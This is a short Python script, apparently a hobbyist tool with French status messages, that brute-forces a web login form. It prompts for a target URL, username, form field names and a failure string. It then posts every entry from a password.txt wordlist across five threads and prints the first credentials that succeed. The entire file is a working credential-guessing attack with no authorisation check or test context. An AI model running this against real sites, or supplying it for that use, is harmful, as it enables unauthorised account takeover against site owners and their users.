from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

def get_passwords():
    with open("password.txt", "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


def try_password(user, password, target_url, user_field, pass_field, failure_str, session):
    data = {
        user_field: user,
        pass_field: password
    }
    try:
        response = session.post(target_url, data=data , timeout=10)  
        print(f"[*] Tentative -> {user}:{password}")
        
        if failure_str not in response.text:
            return password  # Returns the password found
        return None # Incorrect password
    except requests.RequestException:
        print(f"[!] Erreur réseau pour {password} ")
        return None  

def start_bruteforce(user, passwords, target_url, user_field, pass_field, failure_str):
    session = requests.Session()
    found = None # Nothing found

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {
            executor.submit(try_password, user, password, target_url, user_field, pass_field, failure_str, session): password
            for password in passwords
        }

        # as_completed() processes each future as soon as it is complete
        for future in as_completed(futures):
            result = future.result()
            if result and not found:
                found = result # found = the answer that was found
                print(f"\n[+] Credentials trouvés ! {user}:{found}")
                # Cancels requests that have not yet started
                for f in futures:
                    f.cancel()
                break  # Exit the loop properly

    if not found:
        print("[-] Aucun mot de passe trouvé.")


def main():
    passwords_list = get_passwords()
    
    target_url  = input("What is the target URL? : ")
    user        = input("What is the username? : ")
    user_field  = input("What is the username field name? : ")
    pass_field  = input("What is the password field name? : ")
    failure_str = input("What is the failure string? : ")

    start_bruteforce(user, passwords_list, target_url, user_field, pass_field, failure_str)

main()